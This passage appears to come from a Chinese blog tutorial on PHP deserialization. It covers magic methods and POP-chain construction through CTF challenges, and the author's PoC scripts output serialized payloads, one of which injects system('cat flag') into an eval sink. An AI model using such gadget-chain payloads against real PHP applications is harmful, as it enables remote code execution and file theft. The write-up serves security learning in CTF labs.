<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a><strong>__isset()</strong></h4><p>触发时机：对不可访问属性使用isset()或者empty()时</p>
<p>参数：传参$arg1 </p>
<p>返回值：不存在的成员属性名称</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//var</span></span><br></pre></td></tr></tbody></table></figure>





<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a><strong>__unset()</strong></h4><p>触发时机：对不可访问属性使用unset()时</p>
<p>参数：传参$arg1 </p>
<p>返回值：不存在的成员属性名称</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//var</span></span><br></pre></td></tr></tbody></table></figure>



<h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a><strong>__clone()</strong></h4><p>触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">"__clone test"</span>;</span><br><span class="line">          }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//__clone test</span></span><br></pre></td></tr></tbody></table></figure>



<p><strong>魔术方法总结</strong></p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240709084028104.png" alt="image-20240709084028104"></p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240709084034487.png" alt="image-20240709084034487"></p>
<p>例题</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"please attack me"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>反序列化时触发__destruct()  实例化时触发__construct(),但是它会进入normal，所以不能用它 可以看到利用点在evil里的action，我们要给construct里的test实例化为evil就可以了。</p>
<p>poc</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">"system('cat flag');"</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A19%3A%22system%28%27cat+flag%27%29%3B%22%3B%7D%7D</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<h4 id="魔术方法触发规则"><a href="#魔术方法触发规则" class="headerlink" title="魔术方法触发规则"></a>魔术方法触发规则</h4><p>前提：魔术方法所在的类（或对象）被调用</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240709091804654.png" alt="image-20240709091804654"></p>
<p>例题    目标：显示tostring is here!!</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wakeup is here!!"</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"tostring is here!!"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">'benben'</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>poc</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wakeup is here!!"</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>{</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"tostring is here!!"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fast</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sec</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span>\</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:4:"fast":1:{s:6:"source";O:3:"sec":1:{s:6:"benben";N;}}</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h4><p>在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用方法叫做面向属性编程即POP</p>
<p>POC 在安全界可以理解为漏洞验证程序，POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。</p>
<p><img src="/2024/07/31/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240709094330006.png" alt="image-20240709094330006"></p>
<p><strong>例题1</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'pop'</span>])){</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'pop'</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>反推法</p>
<p>-1目标 触发echo，调用$flag</p>
<p>-2第一步：触发invoke，调用append 并使var=flag.php</p>
<p>-3invoke触发条件，把对象当成函数</p>
<p>-4给p赋值，即function 成为Modifier，却被当成函数调用触发invoke</p>
<p>-5触发get（调用不存在的成员属性）</p>
<p>-6给str赋值为对象Test，而test中不存在source，即刻出发get</p>
<p>-7触发tostring(把对象当成字符串)</p>
<p>-8给source赋值对象show</p>
<p>-9触发wakeup</p>
<p>POP链</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">__wakeup-&gt;source::<span class="variable constant_">__toString</span>-&gt;str::<span class="variable constant_">__get</span>-&gt;p::<span class="variable constant_">__invoke</span>-&gt;<span class="keyword">var</span>::<span class="variable constant_">append</span> </span><br></pre></td></tr></tbody></table></figure>



<p>poc</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">'flag.php'</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$mod</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span> -&gt; p = <span class="variable">$mod</span>;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span> -&gt; source = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span> -&gt; str = <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$show</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A13%3A%22%00Modifier%00var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><strong>例题2：[SWPUCTF 2021 新生赛]pop</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">'aaa'</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">'123456'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">'w44m'</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">'08067'</span>){</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'nono'</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;{<span class="variable language_">$this</span>-&gt;w22m}();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">'w00m'</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>poc</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">'w44m'</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">'08067'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">'w44m'</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">'08067'</span>){</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'nono'</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;{<span class="variable language_">$this</span>-&gt;w22m}();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; w00m -&gt; w00m = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; w00m -&gt; w22m = <span class="string">'Getflag'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span></span><br></pre></td></tr></tbody></table></figure>

<p><strong>例题3:Newstar week3 POP Gadget</strong></p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[a-zA-Z0-9]/"</span>,<span class="variable">$this</span>-&gt;name)){</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Hello"</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Welcome to NewStarCTF 2023!"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Good Job!"</span>;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"==GAME OVER=="</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">'pop'</span>]); </span><br></pre></td></tr></tbody></table></figure>

<p>poc</p>
